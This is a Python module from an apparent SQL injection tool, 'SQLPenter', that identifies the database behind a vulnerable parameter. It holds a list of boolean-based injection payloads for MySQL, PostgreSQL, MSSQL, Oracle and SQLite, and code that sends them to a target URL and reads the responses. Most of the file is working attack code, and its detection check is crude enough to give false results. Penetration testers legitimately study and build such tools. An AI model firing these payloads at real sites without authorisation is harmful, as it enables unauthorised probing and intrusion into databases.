#!/usr/bin/env python3
"""
Database fingerprinting module for SQLPenter.
This module helps identify the type of database being used by analyzing response patterns.
"""

import re
import asyncio
from typing import Dict, Any, Optional
import aiohttp
from loguru import logger

from core.utils import create_payload


class DatabaseFingerprinter:
    """
    Identifies the database management system (DBMS) behind a SQL injection vulnerability.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the database fingerprinter.
        
        Args:
            config: Dictionary containing configuration parameters
        """
        self.timeout = config.get("timeout", 5)
        self.proxy = config.get("proxy")
        self.delay = config.get("delay", 0)
        
        # Database fingerprinting payloads with database-specific functions or syntax
        self.fingerprint_tests = {
            "mysql": [
                "AND VERSION() LIKE '%MySQL%'",
                "AND @@version LIKE '%MySQL%'",
                "AND DATABASE() IS NOT NULL"
            ],
            "postgresql": [
                "AND CAST(current_setting('server_version') AS VARCHAR) IS NOT NULL",
                "AND version() LIKE '%PostgreSQL%'",
                "AND current_database() IS NOT NULL"
            ],
            "mssql": [
                "AND @@version LIKE '%Microsoft SQL Server%'",
                "AND SERVERPROPERTY('ProductVersion') IS NOT NULL",
                "AND DB_NAME() IS NOT NULL"
            ],
            "oracle": [
                "AND BANNER LIKE '%Oracle%'",
                "AND USER LIKE '%SYS%'",
                "AND SYS.DATABASE_NAME IS NOT NULL"
            ],
            "sqlite": [
                "AND sqlite_version() IS NOT NULL",
                "AND typeof(1) = 'integer'"
            ]
        }
    
    async def identify_dbms(self, target_url: str, param_info: Dict[str, Any]) -> str:
        """
        Identify the database type by testing database-specific payloads.
        
        Args:
            target_url: The target URL to test
            param_info: Dictionary containing parameter information and injection points
            
        Returns:
            Database type as a string (mysql, postgresql, mssql, oracle, sqlite) or "unknown"
        """
        logger.info(f"Fingerprinting database at {target_url}")
        
        # Set up HTTP session with proxy if needed
        session_kwargs = {
            "timeout": aiohttp.ClientTimeout(total=self.timeout)
        }
        if self.proxy:
            session_kwargs["proxy"] = self.proxy
            
        # Test each database type
        async with aiohttp.ClientSession(**session_kwargs) as session:
            for db_type, tests in self.fingerprint_tests.items():
                for test_payload in tests:
                    # Create the payload using the identified injection point
                    injection_payload = create_payload(param_info["param"], test_payload, param_info["injection_point"])
                    
                    # Create request parameters based on method
                    request_params = {}
                    if param_info["method"].upper() == "GET":
                        request_params["params"] = injection_payload
                    else:
                        request_params["data"] = injection_payload
                    
                    try:
                        # Add delay if configured
                        if self.delay > 0:
                            await asyncio.sleep(self.delay)
                            
                        # Send the request
                        async with session.request(
                            param_info["method"],
                            target_url,
                            **request_params
                        ) as response:
                            content = await response.text()
                            
                            # Check if the request was successful (no error)
                            # The test is considered successful if:
                            # 1. The response contains expected content (original behavior)
                            # 2. The response doesn't contain SQL error messages
                            if response.status == 200 and "error" not in content.lower() and "sql syntax" not in content.lower():
                                logger.debug(f"Positive fingerprint for {db_type} at {target_url}")
                                return db_type
                    
                    except Exception as e:
                        logger.debug(f"Error during fingerprinting: {e}")
                        continue
        
        # If no database type was positively identified
        return "unknown"